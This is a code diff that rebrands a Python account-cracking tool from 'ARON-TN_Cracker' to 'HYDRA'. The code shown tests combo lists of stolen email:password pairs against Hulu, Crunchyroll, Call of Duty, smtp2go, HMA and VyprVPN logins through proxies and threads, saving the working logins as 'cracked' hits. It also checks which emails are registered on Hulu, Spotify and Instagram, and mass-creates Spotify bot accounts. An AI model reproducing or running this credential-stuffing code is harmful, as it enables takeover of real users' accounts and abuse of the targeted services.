@@ -13,14 +13,13 @@ from bs4 import BeautifulSoup
 urllib3.disable_warnings()
 def logo():
  print('''
-   db       .d88b.  d888888b db    db .d8888.       .o88b. db   db d88888b  .o88b. d88888b d8888b. 
-88      .8P  Y8. `~~88~~' 88    88 88'  YP      d8P  Y8 88   88 88'     d8P  Y8 88'     88  `8D 
-88      88    88    88    88    88 `8bo.        8P      88ooo88 88ooooo 8P      88ooooo 88oobY' 
-88      88    88    88    88    88   `Y8b.      8b      88~~~88 88~~~~~ 8b      88~~~~~ 88`8b   
-88booo. `8b  d8'    88    88b  d88 db   8D      Y8b  d8 88   88 88.     Y8b  d8 88.     88 `88. 
-Y88888P  `Y88P'     YP    ~Y8888P' `8888Y'       `Y88P' YP   YP Y88888P  `Y88P' Y88888P 88   YD 
-                                                                                                 
-                                                                                                
+  
+██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗ 
+██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗
+███████║ ╚████╔╝ ██║  ██║██████╔╝███████║
+██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║
+██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║
+╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                                                             
                  }-------------{+} Coded By Lotus Empire {+}-------------{
     {!} - Note : 
@@ -67,7 +66,7 @@ def HuluAccounts(user,passw):
    except:
     response2['device_token']
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked')
-    f = open("ARON-TN_Cracker/Hulu/Accounts_Hits.txt", "a+")
+    f = open("HYDRA/Hulu/Accounts_Hits.txt", "a+")
     f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n')
     f.close()
   except Exception as exx:
@@ -89,7 +88,7 @@ def HuluEmails(user):
    response = s.post('https://signup.hulu.com/api/v2/accounts/status?email='+email,headers=head,timeout=100).json()
    if str(response['status'])=='existing':
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+user+'\n [S] Status : Valid')
-    f = open("ARON-TN_Cracker/Hulu/Emails_Hits.txt", "a+")
+    f = open("HYDRA/Hulu/Emails_Hits.txt", "a+")
     f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n')
     f.close()
    elif str(response['status'])=='invalid':
@@ -114,7 +113,7 @@ def SpotEmail(email):
    response = s.get('https://spclient.wg.spotify.com/signup/public/v1/account?email='+email+'&suggest=1&key=bff58e9698f40080ec4f9ad97a2f21e0&validate=1',headers=head).json()
    if response['status']==20:
      print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+email+'\n [S] Status : Valid')
-     f = open("ARON-TN_Cracker/Spotify/Emails_Hits.txt", "a+")
+     f = open("HYDRA/Spotify/Emails_Hits.txt", "a+")
      f.write('Email : '+email+'\n')
      f.close()
    elif response['status']==1:
@@ -167,7 +166,7 @@ def crunchyrollAccounts(email,passw):
    try:
     response2['data']['user']
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Cracked')
-    f = open("ARON-TN_Cracker/Crunchyroll/Accounts_Hits.txt", "a+")
+    f = open("HYDRA/Crunchyroll/Accounts_Hits.txt", "a+")
     f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Cracked\n')
     f.close()   
    except:
@@ -207,7 +206,7 @@ def callofduty(email,passw):
     print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Invalid')
    elif 'My Call of Duty' in response2:
      print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Cracked')
-     f = open("ARON-TN_Cracker/Cod/Accounts_Hits.txt", "a+")
+     f = open("HYDRA/Cod/Accounts_Hits.txt", "a+")
      f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+email+':'+passw+'\n [S] Status : Cracked\n')
      f.close()
   except Exception as exx:
@@ -220,7 +219,7 @@ def spotifyauto():
    letters = string.ascii_lowercase
    NAME=''.join(random.choice(letters) for i in range(4))
    USR=''.join(random.choice(letters) for i in range(6))
-   amm='Bot'+str(USR)+'@aron.tn'
+   amm='Bot'+str(USR)+'@HYDRA.tn'
    passw='amir23456@'
    data1={
     'gender':'male',
@@ -251,7 +250,7 @@ def spotifyauto():
    response1=s.post('https://spclient.wg.spotify.com/signup/public/v1/account',headers=head1,data=data1).json()
    if str(response1['status'])=='1':
     print('[----------------------------------------------]\n [A] Account : '+amm+':'+passw+'\n [S] Status : Created')
-    f = open("ARON-TN_Cracker/Spotify/Accounts_Created.txt", "a+")
+    f = open("HYDRA/Spotify/Accounts_Created.txt", "a+")
     f.write('[----------------------------------------------]\n [A] Account : '+amm+':'+passw+'\n [S] Status : Created\n')
     f.close()
   except Exception as exx:
@@ -285,7 +284,7 @@ def InstaEmail(email):
    response=requests.post('https://www.instagram.com/accounts/account_recovery_send_ajax/',headers=head,data=data,proxies=proxies).json()
    if response['status']=='ok':
      print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [E] Email : '+email+'\n [S] Status : Valid')
-     f = open("ARON-TN_Cracker/Instagram/Emails_Hits.txt", "a+")
+     f = open("HYDRA/Instagram/Emails_Hits.txt", "a+")
      f.write(str(email)+'\n')
      f.close()
    elif response['status']=='fail':
@@ -313,7 +312,7 @@ def smtp2go(user,passw):
    response = client.post('https://app.smtp2go.com/api/login/',headers=head,data=data,allow_redirects=False).json()
    if response['status'] == 'OK' :
      print('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked')
-     f = open("ARON-TN_Cracker/Smtp2go/Accounts_Hits.txt", "a+")
+     f = open("HYDRA/Smtp2go/Accounts_Hits.txt", "a+")
      f.write('[----------------------------------------------]\n [p] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n')
      f.close()
    elif response['status'] == 'ERROR':
@@ -333,7 +332,7 @@ def hma(user,passw):
   print('[-] '+str(user)+':'+str(passw)+' ==> Invalid')
  else:
   print('[+] '+str(user)+':'+str(passw)+' ==> Valid')
-  f = open("ARON-TN_Cracker/Hma/Hma_Hits.txt", "a+")
+  f = open("HYDRA/Hma/Hma_Hits.txt", "a+")
   f.write('\n++++++++++++++++++\n'+str(response)+'\nLOGIN:'+str(user)+':'+str(passw))
   f.close()
 def VyprVPN(email,passw):
@@ -354,26 +353,26 @@ def VyprVPN(email,passw):
     amir=response.json()
     if amir['vpn']=='null':
      print('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n [P] Plan : Free')
-     f = open("ARON-TN_Cracker/VyprVPN/FreeAccounts_Hits.txt", "a+")
+     f = open("HYDRA/VyprVPN/FreeAccounts_Hits.txt", "a+")
      f.write('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n [P] Plan : Free\n')
      f.close()
     else:
       Plan=str(amir['vpn']['account_level'])
       print('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n [P] Plan : '+Plan)
-      f = open("ARON-TN_Cracker/VyprVPN/PremiumAccounts_Hits.txt", "a+")
+      f = open("HYDRA/VyprVPN/PremiumAccounts_Hits.txt", "a+")
       f.write('[----------------------------------------------]\n [P] Proxy : '+tt+'\n [S] Status : Valid\n [A] Account : '+user+':'+passw+'\n [S] Status : Cracked\n [P] Plan : '+Plan+'\n')
       f.close()
   except Exception as exx:
    continue
   break
 logo()
-Folder('ARON-TN_Cracker')
+Folder('HYDRA')
 try :
- menu=int(input('fcommunity ~# '))
+ menu=int(input('HYDRA ~# '))
 except:
  sys.exit(0)
 if menu==1:
- Folder('ARON-TN_Cracker/Hulu')
+ Folder('HYDRA/Hulu')
  txt = input('[X] Combo List (email:pass) : ')
  filep = input('[X] Proxies List (http) : ')
  Threads=input('[X] Threads Number :')
@@ -394,7 +393,7 @@ if menu==1:
   threads.append(thread)
   thread.start()
 elif menu==2:
- Folder('ARON-TN_Cracker/Hulu')
+ Folder('HYDRA/Hulu')
  txt = input('[X] emails List : ')
  filep = input('[X] Proxies List (http) : ')
  Threads=input('[X] Threads Number :')
@@ -410,7 +409,7 @@ elif menu==2:
   threads.append(thread)
   thread.start()
 elif menu==3:
- Folder('ARON-TN_Cracker/Spotify')
+ Folder('HYDRA/Spotify')
  txt = input('[X] emails List : ')
  filep = input('[X] Proxies List (http) : ')
  Threads=input('[X] Threads Number :')
@@ -426,7 +425,7 @@ elif menu==3:
   threads.append(thread)
   thread.start()
 elif menu==4:
- Folder('ARON-TN_Cracker/Crunchyroll')
+ Folder('HYDRA/Crunchyroll')
  txt = input('[X] Combo List (email:pass) : ')
  filep = input('[X] Proxies List (http) : ')
  Threads=input('[X] Threads Number :')
@@ -446,7 +445,7 @@ elif menu==4:
   threads.append(thread)
   thread.start()
 elif menu==5:
- Folder('ARON-TN_Cracker/Cod')
+ Folder('HYDRA/Cod')
  txt = input('[X] Combo List (email:pass) : ')
  filep = input('[X] Proxies List (http) : ')
  Threads=input('[X] Threads Number :')
@@ -466,11 +465,11 @@ elif menu==5:
   threads.append(thread)
   thread.start()
 elif menu==6:
- Folder('ARON-TN_Cracker/Spotify')
+ Folder('HYDRA/Spotify')
  while True :
   spotifyauto()
 elif menu==7:
- Folder('ARON-TN_Cracker/Instagram')
+ Folder('HYDRA/Instagram')
  txt = input('[X] emails List : ')
  filep = input('[X] Proxies List (http) : ')
  Threads='1'
@@ -486,7 +485,7 @@ elif menu==7:
   threads.append(thread)
   thread.start()
 elif menu==8:
- Folder('ARON-TN_Cracker/Smtp2go')
+ Folder('HYDRA/Smtp2go')
  txt = input('[X] Combo List (email:pass) : ')
  filep = input('[X] Proxies List (http) : ')
  Threads=input('[X] Threads Number :')
@@ -506,7 +505,7 @@ elif menu==8:
    threads.append(thread)
    thread.start()
 elif menu==9:
- Folder('ARON-TN_Cracker/Hma')
+ Folder('HYDRA/Hma')
  txt = input('[X] Combo List (email:pass or user:pass) : ')
  Threads=input('[X] Threads Number :')
  with open(txt) as file:
@@ -519,7 +518,7 @@ elif menu==9:
   threads.append(thread)
   thread.start()
 elif menu==10:
- Folder('ARON-TN_Cracker/VyprVPN')
+ Folder('HYDRA/VyprVPN')
  txt = input('[X] Combo List (email:pass) : ')
  filep = input('[X] Proxies List (http) : ')
  Threads=input('[X] Threads Number :')
